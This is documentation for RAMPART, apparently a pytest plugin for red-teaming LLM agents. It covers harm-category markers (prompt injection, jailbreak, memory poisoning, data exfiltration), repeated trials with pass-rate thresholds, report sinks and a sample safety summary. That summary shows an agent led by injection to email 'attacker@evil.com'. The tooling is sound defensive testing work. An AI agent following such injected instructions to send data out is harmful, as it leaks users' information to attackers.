# pytest Integration

RAMPART is a pytest plugin. It activates automatically when installed — no registration needed.

---

## Markers

### `@pytest.mark.harm(*categories)`

Categorize a test by the type of safety concern it covers. Accepts [`HarmCategory`][rampart.core.result.HarmCategory] enum values or plain strings.

**Why use it:** Harm markers group your tests by risk type. The terminal summary and JSON reports aggregate pass/fail statistics per category, so you can answer questions like "how many of our data exfiltration tests are passing?" at a glance. This is especially useful as your test suite grows — instead of scanning a flat list of test names, you see a structured breakdown by the type of harm you're testing for.

```python
from rampart import HarmCategory

@pytest.mark.harm(HarmCategory.DATA_EXFILTRATION)
async def test_email_exfil(adapter):
    ...

# Custom category (any string works — HarmCategory is a StrEnum)
@pytest.mark.harm("custom_product_risk")
async def test_custom_risk(adapter):
    ...
```

Built-in categories:

| Category | Value |
|----------|-------|
| `MEMORY_POISONING` | `"memory_poisoning"` |
| `PROMPT_INJECTION` | `"prompt_injection"` |
| `JAILBREAK` | `"jailbreak"` |
| `DATA_EXFILTRATION` | `"data_exfiltration"` |
| `OVER_PERMISSIVE_ACTION` | `"over_permissive_action"` |
| `DATA_LEAKAGE` | `"data_leakage"` |
| `CONTENT_SAFETY` | `"content_safety"` |
| `HALLUCINATION` | `"hallucination"` |
| `BEHAVIORAL_REGRESSION` | `"behavioral_regression"` |

### `@pytest.mark.trial(n=, threshold=)`

Declare that a test represents a trial population. The marker remains selectable with `pytest -m trial`, but it does not repeat or clone the test. The defaults are `n=1` and `threshold=1.0`.

Use the `trial_config` fixture to pass the resolved declaration to `execute_trials_async`:

```python
@pytest.mark.trial(n=10, threshold=0.8)
async def test_injection_resistance(adapter, trial_config):
    result = await Attacks.xpia(...).execute_trials_async(
        adapter=adapter,
        n=trial_config.n,
        threshold=trial_config.threshold,
    )
    assert result, result.summary
```

`--rampart-trials=N` overrides only `n`, allowing different sample depths for local and scheduled runs. The threshold is never overridden because it is the test's correctness bar. If a marked test executes a population with different values, RAMPART emits `TrialMismatchWarning`; use `-W error::rampart.pytest_plugin.TrialMismatchWarning` to make mismatches fail the test run.

Class-level trial markers are inherited. A method-level marker shadows the class marker completely; keyword arguments from the two markers are not merged.

## Repeated Executions

### `execute_trials_async(n=, threshold=)`

Run a test multiple times for statistical confidence. Each trial is an independent execution with a fresh session.

**Why use it:** LLM-based agents are non-deterministic — the same prompt can produce different behavior across runs. A single test execution may not be representative. Trials address this by running the same test `n` times independently and calculating an aggregate verdict. The `threshold` parameter lets you set an acceptable pass rate, acknowledging that 100% consistency may be unrealistic while still catching regressions. For example, `threshold=0.8` means "this test should pass at least 80% of the time" — if your agent suddenly drops below that, something changed.

```python
@pytest.mark.trial(n=10, threshold=0.8)
async def test_injection_resistance(adapter, trial_config):
    result = await Attacks.xpia(...).execute_trials_async(
        adapter=adapter,
        n=trial_config.n,
        threshold=trial_config.threshold,
    )
    assert result, result.summary
```

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `n` | `int` | required | Number of trial repetitions |
| `threshold` | `float` | required | Minimum fraction of executed trials that must be SAFE to pass |

**Trial semantics:**

- One logical test produces one pytest verdict
- `threshold` sets the minimum pass rate: `threshold=0.8` requires ≥ 80% SAFE
- An `ERROR` trial resolves the population to `ERROR`
- `UNDETERMINED` trials count against the pass rate
- Individual results and the aggregate verdict are available through `PopulationResult`

!!! tip "Running trials in parallel"
    A call to `execute_trials_async` runs as one pytest item on one worker.

---

## Fixtures

### `trial_config`

Available to tests marked with `@pytest.mark.trial`. It returns an immutable `TrialConfig` with the effective `n` and `threshold`:

```python
from rampart.pytest_plugin import TrialConfig

@pytest.mark.trial(n=5, threshold=0.8)
async def test_population(adapter, trial_config: TrialConfig):
    result = await execution.execute_trials_async(
        adapter=adapter,
        n=trial_config.n,
        threshold=trial_config.threshold,
    )
    assert result, result.summary
```

The effective values are included in each collected result's structured metadata under `_rampart_trial`, allowing reports and cost tooling to account for the population depth. Requesting the fixture from an unmarked test is an error.

---

### `rampart_sinks`

Define this **session-scoped** fixture in your `conftest.py` to configure report output:

```python
from pathlib import Path
import pytest
from rampart.reporting import JsonFileReportSink, ReportSink


@pytest.fixture(scope="session")
def rampart_sinks() -> list[ReportSink]:
    return [JsonFileReportSink(output_dir=Path(".report"))]
```

If you don't define this fixture, RAMPART still prints the terminal summary — but no structured report files are written. You can provide multiple sinks:

```python
@pytest.fixture(scope="session")
def rampart_sinks() -> list[ReportSink]:
    return [
        JsonFileReportSink(output_dir=Path(".report")),
        MyCustomDatabaseSink(connection_string="..."),
    ]
```

!!! warning "xdist compatibility"
    Under [`pytest-xdist`](xdist.md), the controller process discovers fixture-based sinks by calling `rampart_sinks` directly. Fixtures that depend on other fixtures (e.g., `tmp_path_factory`, `request`) cannot be resolved on the controller and are skipped with a warning. Use a parameterless fixture or a module-level list to remain compatible:

    ```python
    # Resolved on the xdist controller (controller-only — single-process
    # discovery needs the fixture form above, or the hook below)
    rampart_sinks = [JsonFileReportSink(output_dir=Path(".report"))]
    ```

    For sinks that need configuration or dependencies, prefer the
    `pytest_rampart_sinks` hook below — it is resolved on the controller and works
    identically in single-process and parallel runs.

---

### `pytest_rampart_sinks` hook

For sinks that need configuration — or to register sinks in a way that behaves
identically in single-process and `pytest-xdist` runs — implement the
`pytest_rampart_sinks` hook in your `conftest.py`:

```python
# conftest.py
from pathlib import Path

from rampart.reporting import JsonFileReportSink


def pytest_rampart_sinks(config):
    return [JsonFileReportSink(output_dir=Path(".report"))]
```

The hook receives the active `pytest.Config`, so you can build
sinks from CLI/ini options or environment variables. Multiple implementations are
supported; RAMPART emits to the **union** of every returned sink.

**Precedence:** when any `pytest_rampart_sinks` implementation exists, it is
authoritative and the `rampart_sinks` fixture path is skipped entirely (so a
project that defines both does not double-register). The fixture remains the
single-process fallback when no hook implementation is present.

---

## Automatic Result Collection

When you call `Attacks.xpia(...).execute_async(adapter=...)` or `Probes.behavior(...).execute_async(adapter=...)` inside a test, RAMPART automatically collects the [`Result`][rampart.core.result.Result]. No manual wiring needed.

This works via [`ExecutionEventHandler`][rampart.core.execution.ExecutionEventHandler] instances the plugin installs on every [`BaseExecution`][rampart.core.execution.BaseExecution] at construction time.

### Manual Recording

For tests that construct [`Result`][rampart.core.result.Result] objects directly (without factories):

```python
from rampart import Result, SafetyStatus, record_result

async def test_manual_result():
    result = Result(
        safe=True,
        status=SafetyStatus.SAFE,
        summary="Agent passed manual check",
    )
    record_result(result)
```

---

## Terminal Summary

After standard pytest output, RAMPART prints a safety summary grouped by harm category:

```
========================= RAMPART Safety Summary =========================

DATA_EXFILTRATION (4 tests)
    FAIL  test_xpia_email_exfil -- Attack objective detected: send_email({'recipient': 'attacker@evil.com'}) (tool_only)
    PASS  test_xpia_email_exfil -- Agent defended successfully (tool_only)
    PASS  test_xpia_search_exfil -- Agent defended successfully (tool_only)
    PASS  test_xpia_search_exfil -- Agent defended successfully (tool_only)

MEMORY_POISONING (1 tests)
  PASS  test_memory_poison -- Agent defended successfully (tool_only)

Population: 5 runs - 1 unsafe (20.0% attack success rate), 0 undetermined, 0 errors
==========================================================================
```

Each result line shows:

- **`PASS`/`FAIL`/`WARN`/`ERR`** — the safety verdict
- **Test name** — repeated executions share one logical pytest test name
- **Summary** — e.g., `Agent defended successfully` or `Attack objective detected: ...`
- **Observability level** — `tool_only`, `tool_and_side_effects`, or `response_only`

The **Population** line shows totals across all tests in the session, with the attack success rate excluding `ERROR` results from the denominator.


